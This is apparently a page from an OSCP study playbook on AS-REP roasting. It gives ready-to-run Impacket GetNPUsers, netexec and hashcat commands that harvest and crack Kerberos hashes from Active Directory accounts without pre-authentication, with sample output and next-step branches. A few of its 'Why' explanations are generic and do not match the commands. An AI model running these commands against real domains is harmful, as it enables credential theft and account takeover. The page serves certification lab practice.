# AD - AS-REP Roasting

**Step 38 of 50 · AD**

*Request Kerberos responses for candidate users and crack any response from an account without pre-authentication.*

## Run this

> **Why:** This command gathers the ad as-rep roasting evidence needed to decide which documented route applies next.
```bash
GetNPUsers.py $Domain/ -dc-ip $BoxIP -usersfile $BoxDir/loot/users.txt -no-pass -request -format hashcat -outputfile $BoxDir/loot/asrep.txt
sed -n '1p' $BoxDir/loot/asrep.txt
hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt
```

## Example output

```

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

(No output for the roastable account, check the output file)

```
$ cat loot/asrep.txt
$krb5asrep$23$username@HTB.LOCAL:a3f1...HASH...c2d9
```
## What did you get?

- [ ] An AS-REP response was written → **Run `hashcat -m 18200 $BoxDir/loot/asrep.txt /usr/share/wordlists/rockyou.txt`, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] The output file is empty → **Run `sed -n '1,20p' $BoxDir/loot/users.txt` to verify the usernames, then go to Step 39 · [[AD - Kerberoasting]]**
- [ ] Hashcat recovered a password → **Set `$Username` and `$Password`, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] Kerberos reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**

## Gotcha

> [!warning] 💡
> GetNPUsers can succeed without a clear success line. Always inspect `$BoxDir/loot/asrep.txt`.

## LDAP and package fallbacks

If LDAPS times out, force LDAP on port 389. If the local Impacket wrapper fails because of a Python package conflict, use the pipx installation.

> **Why:** This collects directory relationships and permissions so indirect paths such as delegated control or replication rights can be seen.
```bash
netexec ldap $BoxIP --port 389 -u $BoxDir/loot/users.txt -p '' --asreproast $BoxDir/loot/asrep.txt
/home/kali/.local/share/pipx/venvs/impacket/bin/GetNPUsers.py $Domain/ -dc-ip $BoxIP -usersfile $BoxDir/loot/users.txt -no-pass -request -format hashcat -outputfile $BoxDir/loot/asrep.txt
```
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- confirmed in the box write-up

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
